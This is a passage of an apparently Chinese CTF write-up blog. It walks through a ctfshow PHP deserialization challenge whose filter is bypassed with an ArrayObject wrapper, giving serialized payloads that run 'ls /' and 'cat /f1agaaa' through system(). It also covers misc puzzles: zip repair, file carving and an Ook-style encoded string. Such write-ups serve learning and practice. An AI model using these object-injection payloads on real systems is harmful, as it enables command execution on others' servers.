invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;ctfshow);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;1+1&gt;2&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>分析一下代码，首先，我们需要知道，怎么进行get传参：<code>$_GET[&#39;1+1&gt;2&#39;]</code></p><p>我们做一个小实验：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>echo print_r($_GET);<br></code></pre></td></tr></table></figure><p>如果我们直接传参：<code>1+1&gt;2</code></p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041430509.png" alt="image-20230404143039437" style="zoom:33%;" /><p>可以发现，<code>+加号</code>被替换为了<code>下滑线_</code>，但是我们将加号替换为url编码：<code>%2B</code></p><p>发现就可以了：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041432688.png" alt="image-20230404143238634" style="zoom:33%;" /><p>我们观察一下这个正则：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果序列化后的串是以O或者A开头，即对象或数组的话，就不行。</p><p>本来想的是使用数值前弄一个加号绕过的，但是反序列化的时候没用</p><p>看了wp后，发现使用了一个内置类：<code>ArrayObject</code></p><p>我们可以将对象传入<code>ArrayObject</code>对象的构造方法中，然后序列化一下，进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-variable">$c</span>-&gt;ctfshow=<span class="hljs-string">&quot;ls /&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">输出：<br>C:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ArrayObject&quot;</span>:<span class="hljs-number">58</span>:&#123;x:i:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span>;&#125;;m:a:<span class="hljs-number">0</span>:&#123;&#125;&#125;<br></code></pre></td></tr></table></figure><p>传参：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041446078.png" alt="image-20230404144648994"></p><p>（注意看，这里还是使用了<code>__wakeup()</code>，但是程序并没有结束，可能是有某些错误造成程序还在执行）</p><p>然后得flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">C:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ArrayObject&quot;</span>:<span class="hljs-number">67</span>:&#123;x:i:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;cat /f1agaaa&quot;</span>;&#125;;m:a:<span class="hljs-number">0</span>:&#123;&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h4><p>下载后得到zip压缩包，我们把两处改为00即可</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040042504.png" alt="image-20230404004242381" style="zoom: 33%;" /><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040043253.png" alt="image-20230404004328215" style="zoom:50%;" /><p>然后在png图片结尾发现一串key：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040044863.png" alt="image-20230404004429821" style="zoom:50%;" /><p>解压后得到：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yurenjie</span><br></code></pre></td></tr></table></figure><p>我们在图片中发现zip文件：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040047362.png" alt="image-20230404004703316" style="zoom:33%;" /><p>使用foremost分离一下，得到zip，解密密码：<code>yurenjie</code></p><p>得到一张crc不匹配的图片，改一下高度即可</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040048484.png" alt="image-20230404004840396" style="zoom:33%;" /><h4 id="哇库哇库2"><a href="#哇库哇库2" class="headerlink" title="哇库哇库2"></a>哇库哇库2</h4><p>下载后得到压缩包，密码如下：</p><blockquote><p>阿尼亚会高数: 哇库哇库！</p><ol><li>key &#x3D; Σ(1&#x2F;(n!))</li><li>“Σ(1&#x2F;(n!))”为无穷级数</li><li>结果四舍五入保留十二位有效数字</li></ol></blockquote><p>我们写个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 密码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">num</span>):<br>    a = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, num + <span class="hljs-number">1</span>):<br>        a = a * x<br>    <span class="hljs-keyword">return</span> a<br><br><br>total = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    m = <span class="hljs-number">1</span> / main(i)<br>    total = total + m<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%.11f&quot;</span> % (total+<span class="hljs-number">1</span>))<br>    <br>密码：<span class="hljs-number">2.71828182846</span><br></code></pre></td></tr></table></figure><p>然后打开docx文件：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041104645.png" alt="image-20230404110449487"></p><p>对比原字幕，发现多了标点符号：<code>。？！</code>，有点像<code>简化版的Ook编码</code>(只有<code>!.?</code>)</p><p>我们将 <code>。？！</code>替换为英文的<code>.?!</code></p><p>然后替换掉换行符，变成一行字符串，如果字符是：<code>.?!</code>，直接输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Start!&#x27;</span>)<br><br><span class="hljs-comment"># f=open(&#x27;flag.txt&#x27;,&#x27;r&#x27;, encoding = &#x27;UTF-8&#x27;)</span><br><br><span class="hljs-comment"># string = f.read()</span><br><br>string = <span class="hljs-string">&#x27;阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.好帅好帅!阿尼亚棒吗?可爱,可爱!阿尼亚不想去上学了!阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.阿尼亚帅不帅?要是不向次子道歉,世界和平就完蛋了.蓬蓬头?交给我吧!欢迎来到阿尼亚家.哇酷哇酷?阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲,阿尼亚合格啦!父亲做菜很好吃.阿尼亚棒吗?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.阿尼亚好兴奋!阿尼亚可爱吗?阿尼亚要加油!阿尼亚在学校也会加油的!好想有个母亲爱我.阿尼亚帅不帅?阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.蓬蓬头?父亲和母亲都很有趣,我最喜欢他们了.哇酷哇酷?阿尼亚必须加油!我想永远和他们在一起.阿尼亚棒吗?父亲做菜很好吃.多亏了父亲.营救公主的间谍!太好了.阿尼亚可爱吗?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.是住在城堡里的奇美拉!阿尼亚帅不帅?救命呀!救救我！劳埃德曼!好想有个母亲爱我.蓬蓬头?阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!哇酷哇酷?阿尼亚喜欢厉害又帅气的母亲.阿尼亚棒吗?太好了!都怪阿尼亚踩到了粑粑.阿尼亚可爱吗?花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚一点也不在意.阿尼亚帅不帅?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.阿尼亚在学校也会加油的!蓬蓬头?阿尼亚必须加油!营救公主的间谍!父亲做菜很好吃.哇酷哇酷?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚棒吗?阿尼亚想去你家玩.阿尼亚可爱吗?是住在城堡里的奇美拉!阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚帅不帅?阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.救命呀!父亲和母亲甜甜蜜蜜.蓬蓬头?会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.救救我！劳埃德曼!哇酷哇酷?阿尼亚好想看呀!完美的劳埃德曼,好想看呀!要是不向次子道歉,世界和平就完蛋了.阿尼亚棒吗?看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚可爱吗?欢迎来到阿尼亚家.阿尼亚帅不帅?阿尼亚想吃蛋包饭!阿尼亚想穿这身衣服出萌.蓬蓬头?警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.交给我吧!多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.父亲,阿尼亚合格啦!会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚好兴奋!阿尼亚想穿这身衣服出萌.哇酷哇酷?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.阿尼亚要加油!阿尼亚棒吗?阿尼亚在学校也会加油的!阿尼亚必须加油!母亲,给阿尼亚做特训吧.阿尼亚可爱吗?营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!阿尼亚帅不帅?要是不向次子道歉,世界和平就完蛋了.蓬蓬头?可爱,可爱!欢迎来到阿尼亚家.哇酷哇酷?阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!阿尼亚想穿这身衣服出萌.阿尼亚棒吗?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.父亲,母亲,有需要帮助的人!阿尼亚可爱吗?要帮助他!太好了!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.蓬蓬头?母亲是杀手.哇酷哇酷?花生!父亲和母亲甜甜蜜蜜.阿尼亚棒吗?会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.阿尼亚想吃蛋包饭!父亲是间谍.警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!母亲是杀手.阿尼亚可爱吗?父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.营救公主的间谍!阿尼亚帅不帅?是住在城堡里的奇美拉!救命呀!欢迎来到阿尼亚家.蓬蓬头?阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.哇酷哇酷?阿尼亚不想要这个妈妈.阿尼亚棒吗?救救我！劳埃德曼!父亲是间谍.阿尼亚可爱吗?阿尼亚好想看呀!母亲是杀手.阿尼亚帅不帅?父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.完美的劳埃德曼,好想看呀!蓬蓬头?看我必杀拳,砰!好耶!欢迎来到阿尼亚家.哇酷哇酷?父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!阿尼亚棒吗?阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?可爱,可爱!阿尼亚想去你家玩.阿尼亚帅不帅?阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!阿尼亚从孤儿院出来以后,遇到了好多开心的事.太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!阿尼亚好失落.蓬蓬头?好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.好帅好帅!哇酷哇酷?可爱,可爱!阿尼亚不想去上学了!父亲和母亲都很有趣,我最喜欢他们了.阿尼亚棒吗?交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!阿尼亚可爱吗?我想永远和他们在一起.阿尼亚帅不帅?救命呀!父亲做菜很好吃.蓬蓬头?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!多亏了父亲.哇酷哇酷?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚想吃蛋包饭!阿尼亚棒吗?警惕!阿尼亚想像母亲一样厉害!阿尼亚喜欢厉害又帅气的母亲.阿尼亚可爱吗?都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.阿尼亚帅不帅?我想永远和他们在一起.蓬蓬头?好帅好帅!父亲做菜很好吃.哇酷哇酷?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.可爱,可爱!阿尼亚一点也不在意.阿尼亚棒吗?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.阿尼亚不想去上学了!阿尼亚可爱吗?交给我吧!父亲,阿尼亚合格啦!父亲做菜很好吃.阿尼亚帅不帅?阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!蓬蓬头?多亏了父亲.哇酷哇酷?救命呀!太好了.阿尼亚棒吗?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!母亲,给阿尼亚做特训吧.阿尼亚可爱吗?要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.看我必杀拳,砰!阿尼亚帅不帅?好耶!父亲,母亲,有需要帮助的人!阿尼亚喜欢厉害又帅气的母亲.蓬蓬头?都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.哇酷哇酷?会没事的.阿尼亚棒吗?要帮助他!父亲和母亲都很有趣,我最喜欢他们了.阿尼亚可爱吗?我想永远和他们在一起.父亲做菜很好吃.太好了!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.花生!蓬蓬头?阿尼亚想吃蛋包饭!警惕!父亲是间谍.哇酷哇酷?阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!阿尼亚棒吗?母亲是杀手.阿尼亚可爱吗?救命呀!父亲和母亲甜甜蜜蜜.阿尼亚帅不帅?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!会没事的.蓬蓬头?父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚好想看呀!哇酷哇酷?完美的劳埃德曼,好想看呀!看我必杀拳,砰!阿尼亚一点也不在意.阿尼亚棒吗?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?阿尼亚想去你家玩.阿尼亚帅不帅?好耶!阿尼亚从孤儿院出来以后,遇到了好多开心的事.蓬蓬头?阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.父亲,母亲,有需要帮助的人!太好了.哇酷哇酷?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.要帮助他!阿尼亚棒吗?太好了!花生!我想永远和他们在一起.阿尼亚可爱吗?阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿